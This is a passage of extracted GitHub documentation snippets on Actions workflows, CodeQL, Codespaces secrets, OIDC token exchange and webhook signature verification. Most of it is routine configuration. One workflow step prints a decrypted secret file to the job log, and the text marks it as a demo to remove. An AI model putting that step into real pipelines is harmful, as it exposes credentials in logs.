https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_39\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  push:\n    paths:\n      - '**.js'\n```\n\n----------------------------------------\n\nTITLE: Accessing Repository Dispatch Payload in Workflow (YAML)\nDESCRIPTION: This workflow configuration demonstrates how to access data sent in the `client_payload` of a `repository_dispatch` event. It checks if the `passed` value is false and then echoes the `message` to the console.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_45\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  repository_dispatch:\n    types: [test_result]\n\njobs:\n  run_if_failure:\n    if: {% raw %}${{ !github.event.client_payload.passed }}{% endraw %}\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          MESSAGE: {% raw %}${{ github.event.client_payload.message }}{% endraw %}\n        run: echo $MESSAGE\n```\n\n----------------------------------------\n\nTITLE: Add comment on issue label with GitHub Actions\nDESCRIPTION: This workflow triggers when an issue is labeled. It checks if the added label matches 'help wanted', and if so, it adds a pre-defined comment to the issue using the `gh issue comment` command. The workflow requires the `issues: write` permission to add comments.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/project-management/commenting-on-an-issue-when-a-label-is-added.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: Add comment\non:\n  issues:\n    types:\n      - labeled\njobs:\n  add-comment:\n    if: github.event.label.name == 'help wanted'\n    runs-on: ubuntu-latest\n    permissions:\n      issues: write\n    steps:\n      - name: Add comment\n        run: gh issue comment \"$NUMBER\" --body \"$BODY\"\n        env:\n          GH_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n          GH_REPO: {% raw %}${{ github.repository }}{% endraw %}\n          NUMBER: {% raw %}${{ github.event.issue.number }}{% endraw %}\n          BODY: >\n            This issue is available for anyone to work on.\n            **Make sure to reference this issue in your pull request.**\n            :sparkles: Thank you for your contribution! :sparkles:\n```\n\n----------------------------------------\n\nTITLE: Workflow for Removing Label on Project Card Move (YAML)\nDESCRIPTION: This YAML defines a GitHub Actions workflow that triggers when a project card is moved. It checks if the card is moved to a specific column (identified by `column_id`) and, if so, removes a specified label from the associated issue or pull request using the `actions/github-script` action.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/project-management/removing-a-label-when-a-card-is-added-to-a-project-board-column.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: Remove a label\non:\n  project_card:\n    types:\n      - moved\njobs:\n  remove_label:\n    if: github.event.project_card.column_id == '12345678'\n    runs-on: ubuntu-latest\n    permissions:\n      issues: write\n      pull-requests: write\n    steps:\n      - uses: {% data reusables.actions.action-github-script %}\n        with:\n          script: |\n            // this gets the number at the end of the content URL, which should be the issue/PR number\n            const issue_num = context.payload.project_card.content_url.split('/').pop()\n            github.rest.issues.removeLabel({\n              issue_number: issue_num,\n              owner: context.repo.owner,\n              repo: context.repo.repo,\n              name: [\"needs review\"]\n            })\n```\n\n----------------------------------------\n\nTITLE: Creating CodeQL Database for C# Project with Dotnet Build\nDESCRIPTION: This snippet demonstrates how to create a CodeQL database for a C# project built using `dotnet build`. It recommends adding `/t:rebuild` or a prior `dotnet clean` to ensure all code is built and included in the database. It assumes .NET SDK and CodeQL CLI are installed and accessible.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database create csharp-database --language=csharp --command='dotnet build /t:rebuild'\n```\n\n----------------------------------------\n\nTITLE: Adding a Feature to devcontainer.json\nDESCRIPTION: Shows how to add a feature, specifically Terraform, to the `features` object in a `devcontainer.json` file. This enables the use of the Terraform tool within the development container. The code uses a feature identifier 'ghcr.io/devcontainers/features/terraform:1'.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/configuring-dev-containers/adding-features-to-a-devcontainer-file.md#_snippet_0\n\nLANGUAGE: JSONC\nCODE:\n```\n   \"features\": {\n        // ...\n        \"ghcr.io/devcontainers/features/terraform:1\": {},\n        // ...\n\t}\n```\n\n----------------------------------------\n\nTITLE: Using a Specific Go Version\nDESCRIPTION: This snippet demonstrates how to configure a job to use a specific version of Go, such as '1.21.x', using the `setup-go` action. This ensures the workflow uses the desired Go version for building and testing.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-go.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\n      - name: Setup Go 1.21.x\n        uses: {% data reusables.actions.action-setup-go %}\n        with:\n          # Semantic version range syntax or exact version of Go\n          go-version: '1.21.x'\n```\n\n----------------------------------------\n\nTITLE: Getting ID Token using cURL in Actions\nDESCRIPTION: This YAML snippet demonstrates how to retrieve an ID token using cURL within a GitHub Actions workflow. It sends a request to the `ACTIONS_ID_TOKEN_REQUEST_URL` with the specified audience (`jfrog-github`) and extracts the token value. This snippet assumes that the `ACTIONS_ID_TOKEN_REQUEST_TOKEN` and `ACTIONS_ID_TOKEN_REQUEST_URL` environment variables are properly set by the runner.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-jfrog.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n- name: Get ID Token (cURL method)\n        id: idtoken\n        run: |\n          ID_TOKEN=$(curl -sLS -H \"User-Agent: actions/oidc-client\" -H \"Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN\" \\\n          \"${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=jfrog-github\" | jq .value | tr -d '\"')\n          echo \"ID_TOKEN=${ID_TOKEN}\" >> $GITHUB_OUTPUT\n```\n\n----------------------------------------\n\nTITLE: Defining Azure Container Registry Secrets for Codespaces\nDESCRIPTION: This example demonstrates how to define secrets for accessing a private Azure Container Registry (ACR) within a GitHub Codespace. These secrets are used for authentication and are stored securely within GitHub. The secrets need to be created with a consistent identifier. The server name, username, and password (typically a personal access token) are required.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/reference/allowing-your-codespace-to-access-a-private-registry.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nACR_CONTAINER_REGISTRY_SERVER = mycompany.azurecr.io\nACR_CONTAINER_REGISTRY_USER = acr-user-here\nACR_CONTAINER_REGISTRY_PASSWORD = <PERSONAL_ACCESS_TOKEN>\n```\n\n----------------------------------------\n\nTITLE: Setting up CLI with actions/toolkit in JavaScript\nDESCRIPTION: This JavaScript code demonstrates how to download, extract, and add a CLI tool to the PATH using the `@actions/core` and `@actions/tool-cache` packages from the `actions/toolkit`. It takes a version input from the user, downloads the specified version of the CLI as a tarball, extracts it, and then adds the CLI's path to the runner's PATH environment variable.  The `getDownloadURL` function needs to be implemented to provide the correct download URL for the CLI based on the specified version.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/developing-a-third-party-cli-action.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst core = require('@actions/core');\nconst tc = require('@actions/tool-cache');\n\nasync function setup() {\n  // Get version of tool to be installed\n  const version = core.getInput('version');\n\n  // Download the specific version of the tool, e.g. as a tarball\n  const pathToTarball = await tc.downloadTool(getDownloadURL());\n\n  // Extract the tarball onto the runner\n  const pathToCLI = await tc.extractTar(pathToTarball);\n\n  // Expose the tool by adding it to the PATH\n  core.addPath(pathToCLI)\n}\n\nmodule.exports = setup\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Condition Syntax\nDESCRIPTION: This YAML snippet illustrates how to define conditions in GitHub Actions using the `if` key. It defines a job named `deploy_prod` that will only run if the `github.ref` contains 'master'.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-gitlab-cicd-to-github-actions.md#_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  deploy_prod:\n    if: contains( github.ref, 'master')\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"Deploy to production server\"\n```\n\n----------------------------------------\n\nTITLE: Setting Permissions for Container Image Attestation Generation\nDESCRIPTION: This code snippet configures the necessary permissions in a GitHub Actions workflow to allow the generation of artifact attestations specifically for container images. It grants write access to the `id-token`, read access to the `contents`, and write access to `attestations` and `packages`. These permissions are essential for the workflow to interact with the GitHub Actions attestation services and push the container image.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\npermissions:\n  id-token: write\n  contents: read\n  attestations: write\n  packages: write\n```\n\n----------------------------------------\n\nTITLE: Creating an Azure App Service Web App (Bash)\nDESCRIPTION: This bash command creates an Azure App Service web app with a PHP runtime. It uses the Azure CLI (az) to create the web app, specifying the name, App Service plan, resource group, and PHP runtime version. Replace the placeholder values with your actual resource names and desired PHP version.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-php-to-azure-app-service.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\naz webapp create \\\n    --name MY_WEBAPP_NAME \\\n    --plan MY_APP_SERVICE_PLAN \\\n    --resource-group MY_RESOURCE_GROUP \\\n    --runtime \"php|7.4\"\n```\n\n----------------------------------------\n\nTITLE: Signature Validation in JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates how to validate a Github webhook signature. It fetches public keys from the Github API using `axios`, identifies the correct key based on the `keyID`, and verifies the signature against the payload using the `ECDSA-NIST-P256V1-SHA256` algorithm via Node's `crypto` module. The function throws an error if the signature is invalid or if required parameters are missing.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/secret-scanning/secret-scanning-partnership-program/secret-scanning-partner-program.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nconst crypto = require(\"crypto\");\nconst axios = require(\"axios\");\n\nconst GITHUB_KEYS_URI = \"https://api.github.com/meta/public_keys/secret_scanning\";\n\n/**\n * Verify a payload and signature against a public key\n * @param {String} payload the value to verify\n * @param {String} signature the expected value\n * @param {String} keyID the id of the key used to generated the signature\n * @return {void} throws if the signature is invalid\n */\nconst verify_signature = async (payload, signature, keyID) => {\n  if (typeof payload !== \"string\" || payload.length === 0) {\n    throw new Error(\"Invalid payload\");\n  }\n  if (typeof signature !== \"string\" || signature.length === 0) {\n    throw new Error(\"Invalid signature\");\n  }\n  if (typeof keyID !== \"string\" || keyID.length === 0) {\n    throw new Error(\"Invalid keyID\");\n  }\n\n  const keys = (await axios.get(GITHUB_KEYS_URI)).data;\n  if (!(keys?.public_keys instanceof Array) || keys.length === 0) {\n    throw new Error(\"No public keys found\");\n  }\n\n  const publicKey = keys.public_keys.find((k) => k.key_identifier === keyID) ?? null;\n  if (publicKey === null) {\n    throw new Error(\"No public key found matching key identifier\");\n  }\n\n  const verify = crypto.createVerify(\"SHA256\").update(payload);\n  if (!verify.verify(publicKey.key, Buffer.from(signature, \"base64\"), \"base64\")) {\n    throw new Error(\"Signature does not match payload\");\n  }\n};\n\n```\n\n----------------------------------------\n\nTITLE: Configuring GitHub App Authentication\nDESCRIPTION: This snippet demonstrates how to specify GitHub App credentials (app_id, installation_id, and private_key) directly within the `values.yaml` file for authenticating with the GitHub API.  The `githubConfigSecret` section defines these values.  The private key must be properly formatted.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\n## githubConfigSecret is the Kubernetes secret to use when authenticating with GitHub API.\n## You can choose to use a GitHub App or a {% data variables.product.pat_v1 %}\ngithubConfigSecret:\n  ## GitHub Apps Configuration\n  ## IDs must be strings, use quotes\n  github_app_id: \"123456\"\n  github_app_installation_id: \"654321\"\n  github_app_private_key: |\n    -----BEGIN RSA PRIVATE KEY-----\n    ...\n    HkVN9...\n    ...\n    -----END RSA PRIVATE KEY-----\n```\n\n----------------------------------------\n\nTITLE: Testing Python code with pytest\nDESCRIPTION: This snippet installs pytest and pytest-cov, then runs tests and outputs results in JUnit and Cobertura formats.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-python.md#_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n- uses: {% data reusables.actions.action-checkout %}\n- name: Set up Python\n  uses: {% data reusables.actions.action-setup-python %}\n  with:\n    python-version: '3.x'\n- name: Install dependencies\n  run: |\n    python -m pip install --upgrade pip\n    pip install -r requirements.txt\n- name: Test with pytest\n  run: |\n    pip install pytest pytest-cov\n    pytest tests.py --doctest-modules --junitxml=junit/test-results.xml --cov=com --cov-report=xml --cov-report=html\n```\n\n----------------------------------------\n\nTITLE: Combining Workflow Queries with Configuration File\nDESCRIPTION: This YAML snippet shows how to combine queries and packs specified in a workflow with those defined in a configuration file. The `+` symbol prepended to the `queries` and `packs` values ensures that the workflow settings are used in addition to the configuration file settings. `config-file` specifies the path to the configuration file.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.md#_snippet_12\n\nLANGUAGE: yaml\nCODE:\n```\n- uses: {% data reusables.actions.action-codeql-action-init %}\n  with:\n    config-file: ./.github/codeql/codeql-config.yml\n    queries: +security-and-quality,octo-org/python-qlpack/show_ifs.ql@main\n    packs: +scope/pack1,scope/pack2@1.2.3,scope/pack3@4.5.6:path/to/queries\n```\n\n----------------------------------------\n\nTITLE: Minimum SARIF Properties Example\nDESCRIPTION: This SARIF output file demonstrates the minimum required properties for code scanning results to be displayed correctly on GitHub. It includes the schema, version, runs, tool, driver, rules, results, locations, physicalLocation, artifactLocation, region, and partialFingerprints.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/integrating-with-code-scanning/sarif-support-for-code-scanning.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"$schema\": \"https://json.schemastore.org/sarif-2.1.0.json\",\n  \"version\": \"2.1.0\",\n  \"runs\": [\n    {\n      \"tool\": {\n        \"driver\": {\n          \"name\": \"Tool Name\",\n          \"rules\": [\n            {\n              \"id\": \"R01\"\n                      ...\n              \"properties\" : {\n                 \"id\" : \"java/unsafe-deserialization\",\n                 \"kind\" : \"path-problem\",\n                 \"name\" : \"...\",\n                 \"problem.severity\" : \"error\",\n                 \"security-severity\" : \"9.8\",\n               }\n            }\n          ]\n        }\n      },\n      \"results\": [\n        {\n          \"ruleId\": \"R01\",\n          \"message\": {\n            \"text\": \"Result text. This result does not have a rule associated.\"\n          },\n          \"locations\": [\n            {\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"fileURI\"\n                },\n                \"region\": {\n                  \"startLine\": 2,\n                  \"startColumn\": 7,\n                  \"endColumn\": 10\n                }\n              }\n            }\n          ],\n          \"partialFingerprints\": {\n            \"primaryLocationLineHash\": \"39fa2ee980eb94b0:1\"\n          }\n        }\n      ]\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Specifying Action Inputs in YAML\nDESCRIPTION: This example shows how to define input parameters for a GitHub Action using YAML. It configures two inputs, `num-octocats` (optional, defaults to '1') and `octocat-eye-color` (required, no default).  Workflow files can use the `with` keyword to set input values.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\ninputs:\n  num-octocats:\n    description: 'Number of Octocats'\n    required: false\n    default: '1'\n  octocat-eye-color:\n    description: 'Eye color of the Octocats'\n    required: true\n```\n\n----------------------------------------\n\nTITLE: Assigning multiple labels during runner configuration using config.sh\nDESCRIPTION: This code snippet demonstrates assigning multiple labels (gpu, x64, linux) during the initial configuration of a self-hosted runner using the `config.sh` script and the `--labels` parameter. Comma separation is used to specify multiple labels.  The script requires the repository URL and a registration token.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/using-labels-with-self-hosted-runners.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n./config.sh --url <REPOSITORY_URL> --token <REGISTRATION_TOKEN> --labels gpu,x64,linux\n```\n\n----------------------------------------\n\nTITLE: Specifying Action Version Using Tag in Workflow (YAML)\nDESCRIPTION: This snippet illustrates how to specify a version of an action using a tag in a GitHub Actions workflow file.  Using tags is a common release management strategy for actions, though they can be moved or deleted. Pinning to a tag helps control when updates are applied to the workflow. Requires the actions/javascript-action repository.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/using-pre-written-building-blocks-in-your-workflow.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n```yaml\nsteps:\n  - uses: actions/javascript-action@v1.0.1\n```\n```\n\n----------------------------------------\n\nTITLE: Example User Access Token Request\nDESCRIPTION: Example request for exchanging a code for a user access token.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/authenticating-with-a-github-app/generating-a-user-access-token-for-a-github-app.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\n{% data reusables.apps.user-access-token-example-request %}\n```\n\n----------------------------------------\n\nTITLE: Setting and Using Environment Variables in a Workflow\nDESCRIPTION: This YAML configuration demonstrates how to set an environment variable (`MY_ENV_VAR`) in one step and use it in a subsequent step within the same job. The variable is set by appending to the `$GITHUB_ENV` file. Requires the `ubuntu-latest` runner.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_27\n\nLANGUAGE: yaml\nCODE:\n```\nname: Example Workflow for Environment Files\n\non: push\n\njobs:\n  set_and_use_env_vars:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Set environment variable\n        run: echo \"MY_ENV_VAR=myValue\" >> $GITHUB_ENV\n\n      - name: Use environment variable\n        run: |\n          echo \"The value of MY_ENV_VAR is $MY_ENV_VAR\"\n\n```\n\n----------------------------------------\n\nTITLE: Using a Public Action in GitHub Actions Workflow (YAML)\nDESCRIPTION: This YAML snippet shows how to use a public action in a GitHub Actions workflow by specifying the repository, owner, and optionally a specific branch, ref, or SHA. It uses the `uses` keyword to specify the action's location and the `name` keyword for readability.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_11\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  my_first_job:\n    steps:\n      - name: My first step\n        # Uses the default branch of a public repository\n        uses: actions/heroku@main\n      - name: My second step\n        # Uses a specific version tag of a public repository\n        uses: actions/aws@v2.0.1\n```\n\n----------------------------------------\n\nTITLE: Complete Dependency Review Configuration\nDESCRIPTION: This YAML snippet shows the complete customized dependency review action configuration file.  It includes checks for severity, licenses and scope.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/supply-chain-security/understanding-your-software-supply-chain/customizing-your-dependency-review-action-configuration.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nname: 'Dependency Review'\non: [pull_request]\n\n\n\npermissions:\n  contents: read\n\n\n\njobs:\n  dependency-review:\n    runs-on: ubuntu-latest\n    steps:\n      - name: 'Checkout Repository'\n        uses: {% data reusables.actions.action-checkout %}\n      - name: Dependency Review\n        uses: actions/dependency-review-action@v4\n        with:\n          fail-on-severity: moderate\n          deny-licenses: LGPL-2.0, BSD-2-Clause\n          fail-on-scopes: development\n```\n\n----------------------------------------\n\nTITLE: Installing Actions Toolkit Packages\nDESCRIPTION: These commands install the `@actions/core` and `@actions/github` packages from npm. These packages provide functions for interacting with the GitHub Actions environment, such as setting inputs, outputs, and accessing the GitHub API.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-javascript-action.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nnpm install @actions/core\n```\n\nLANGUAGE: shell\nCODE:\n```\nnpm install @actions/github\n```\n\n----------------------------------------\n\nTITLE: Specifying Node.js Version with Matrix Strategy\nDESCRIPTION: This example shows how to use a matrix strategy to test your code against multiple Node.js versions. The `node-version` array specifies the versions to use, and the `setup-node` action configures each job with the corresponding version. The matrix context allows accessing the value defined in `node-version`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-nodejs.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\nstrategy:\n  matrix:\n    node-version: ['18.x', '20.x']\n\nsteps:\n- uses: {% data reusables.actions.action-checkout %}\n- name: Use Node.js {% raw %}${{ matrix.node-version }}{% endraw %}\n  uses: {% data reusables.actions.action-setup-node %}\n  with:\n    node-version: {% raw %}${{ matrix.node-version }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Forwarding traffic to local server using ngrok with ephemeral domain\nDESCRIPTION: This command uses ngrok to create a tunnel to forward traffic from a public ngrok URL to your local server. Replace `EXTENSION-PORT-NUMBER` with the port number your extension is running on. This command generates a temporary ngrok URL for accessing your local server.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/creating-a-copilot-extension/configuring-your-server-to-host-your-copilot-extension.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nngrok http http://localhost:EXTENSION-PORT-NUMBER\n```\n\n----------------------------------------\n\nTITLE: Trigger workflow on pull request target with branch filter\nDESCRIPTION: This workflow triggers when a pull request targets a branch whose name starts with 'releases/'. It demonstrates using the `branches` filter to run workflows on pull requests targeting specific branches.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_31\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  pull_request_target:\n    types:\n      - opened\n    branches:\n      - 'releases/**'\n```\n\n----------------------------------------\n\nTITLE: Running ESLint Code Analysis\nDESCRIPTION: This step executes ESLint to perform code analysis on the specified directories (`build docs lib script spec-main`). The `-f` flag specifies the SARIF formatter, and `-o` sets the output file path to `results.sarif`. `|| true` is added to prevent the workflow from failing if ESLint finds errors.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/integrating-with-code-scanning/uploading-a-sarif-file-to-github.md#_snippet_5\n\nLANGUAGE: YAML\nCODE:\n```\n- name: Run ESLint\n  # eslint exits 1 if it finds anything to report\n  run: node_modules/.bin/eslint build docs lib script spec-main -f node_modules/@microsoft/eslint-formatter-sarif/sarif.js -o results.sarif || true\n```\n\n----------------------------------------\n\nTITLE: Using a Custom Shell (YAML)\nDESCRIPTION: This YAML snippet demonstrates using a custom shell in a GitHub Actions workflow. It sets the `shell` value to a template string using `command [options] {0} [more_options]`, where `{0}` is replaced with the temporary script's filename. The command used must be installed on the runner.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_25\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - name: Display the environment variables and their values\n    shell: perl {0}\n    run: |\n      print %ENV\n```\n\n----------------------------------------\n\nTITLE: Displaying commit history with git log (example)\nDESCRIPTION: This snippet demonstrates the output of the `git log` command, showing a history of commits on a branch. It includes the commit SHA, author, date, and commit message. This is used to identify the earliest commit containing a secret.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/secret-scanning/working-with-secret-scanning-and-push-protection/working-with-push-protection-from-the-command-line.md#_snippet_1\n\nLANGUAGE: text\nCODE:\n```\ntest-repo (test-branch)]$ git log\ncommit 8053f7b27 (HEAD -> main)\nAuthor: Octocat <1000+octocat@users.noreply.github.com\nDate:   Tue Jan 30 13:03:37 2024 +0100\n\n  my fourth commit message\n\ncommit 03d69e5d3\nAuthor: Octocat <1000+octocat@users.noreply.github.com>\nDate:   Tue Jan 30 13:02:59 2024 +0100\n\n  my third commit message\n\ncommit 8728dbe67\nAuthor: Octocat <1000+octocat@users.noreply.github.com\nDate:   Tue Jan 30 13:01:36 2024 +0100\n\n  my second commit message\n\ncommit 6057cbe51\nAuthor: Octocat <1000+octocat@users.noreply.github.com\nDate:   Tue Jan 30 12:58:24 2024 +0100\n\n  my first commit message\n```\n\n----------------------------------------\n\nTITLE: Workflow to decrypt large secret\nDESCRIPTION: This workflow defines a job that checks out the repository, decrypts a large secret using a shell script, and then demonstrates how to access the decrypted secret.  It utilizes the `actions/checkout` action and sets an environment variable `LARGE_SECRET_PASSPHRASE` from a GitHub secret. The final step, printing the secret, is included for demonstration and should be removed in production.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions.md#_snippet_18\n\nLANGUAGE: yaml\nCODE:\n```\nname: Workflows with large secrets\n\non: push\n\njobs:\n  my-job:\n    name: My Job\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Decrypt large secret\n        run: ./decrypt_secret.sh\n        env:\n          LARGE_SECRET_PASSPHRASE: {% raw %}${{ secrets.LARGE_SECRET_PASSPHRASE }}{% endraw %}\n      # This command is just an example to show your secret being printed\n      # Ensure you remove any print statements of your secrets. GitHub does\n      # not hide secrets that use this workaround.\n      - name: Test printing your secret (Remove this step in production)\n        run: cat $HOME/secrets/my_secret.json\n```\n\n----------------------------------------\n\nTITLE: Fetching Access Token from Artifactory using cURL\nDESCRIPTION: This YAML snippet shows how to fetch an access token from Artifactory using cURL in a GitHub Actions workflow. It utilizes the ID token obtained from the OIDC provider and exchanges it for an access token using the JFrog access API.  The `YOUR_PROVIDER_NAME` placeholder should be replaced with the name configured in JFrog.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-jfrog.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n- name: Fetch Access Token from Artifactory\n        id: fetch_access_token\n        env:\n          ID_TOKEN: ${{ steps.idtoken.outputs.id_token }}\n        run: |\n          ACCESS_TOKEN=$(curl \\\n          -X POST \\\n          -H \"Content-type: application/json\" \\\n          https://example.jfrog.io/access/api/v1/oidc/token \\\n          -d \\\n          \"{\\\"grant_type\\\": \\\"urn:ietf:params:oauth:grant-type:token-exchange\\\", \\\"subject_token_type\\\":\\\"urn:ietf:params:oauth:token-type:id_token\\\", \\\"subject_token\\\": \\\"$ID_TOKEN\\\", \\\"provider_name\\\": \\\"YOUR_PROVIDER_NAME\\\"}\" | jq .access_token | tr -d '\"')\n          echo ACCESS_TOKEN=$ACCESS_TOKEN >> $GITHUB_OUTPUT\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_JOB_ID to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_JOB_ID` to the GitHub Actions equivalent `${{ github.job }}`.  `${{ github.job }}` contains the job id in Github Actions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_23\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.job }}\n```\n\n----------------------------------------\n\nTITLE: Generating Code from Comments using GitHub Copilot in Java\nDESCRIPTION: This code snippet illustrates how GitHub Copilot can generate Java code based on a natural language comment. The user provides a comment describing the desired functionality, and Copilot suggests the corresponding code implementation. This snippet requires a Java environment and access to GitHub Copilot.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/getting-code-suggestions-in-your-ide-with-github-copilot.md#_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\n// find all images without alternate text\n// and give them a red border\nvoid process () {\n```\n\n----------------------------------------\n\nTITLE: Using GitHub Context Event Name\nDESCRIPTION: This YAML workflow snippet demonstrates how to use the `github.event_name` context to conditionally run a job based on the event that triggered the workflow (e.g., `pull_request`).  The `if` condition checks if the event name is 'pull_request'.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nname: Run CI\non: [push, pull_request]\n\njobs:\n  normal_ci:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Run normal CI\n        run: echo \"Running normal CI\"\n\n  pull_request_ci:\n    runs-on: ubuntu-latest\n    if: {% raw %}${{ github.event_name == 'pull_request' }}{% endraw %}\n    steps:\n      - name: Run PR CI\n        run: echo \"Running PR only CI\"\n```\n\n----------------------------------------\n\nTITLE: Verifying Webhook Signature with TypeScript\nDESCRIPTION: This TypeScript code snippet demonstrates how to verify a webhook signature using the `@octokit/webhooks` library. It creates a `Webhooks` instance with the webhook secret from the environment variables. It defines an asynchronous `handleWebhook` function that extracts the signature and request body, then uses the `webhooks.verify` method to validate the signature. If the signature is invalid, it sends a 401 Unauthorized response. It assumes that the `WEBHOOK_SECRET` environment variable is set and that the request object has `headers` and `text()` methods.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/using-webhooks/validating-webhook-deliveries.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nimport { Webhooks } from \"@octokit/webhooks\";\n\nconst webhooks = new Webhooks({\n  secret: process.env.WEBHOOK_SECRET,\n});\n\nconst handleWebhook = async (req, res) => {\n  const signature = req.headers[\"x-hub-signature-256\"];\n  const body = await req.text();\n\n  if (!(await webhooks.verify(body, signature))) {\n    res.status(401).send(\"Unauthorized\");\n    return;\n  }\n\n  // The rest of your logic here\n};\n```\n\n----------------------------------------\n\nTITLE: Enabling Dependency Caching in CodeQL Workflow 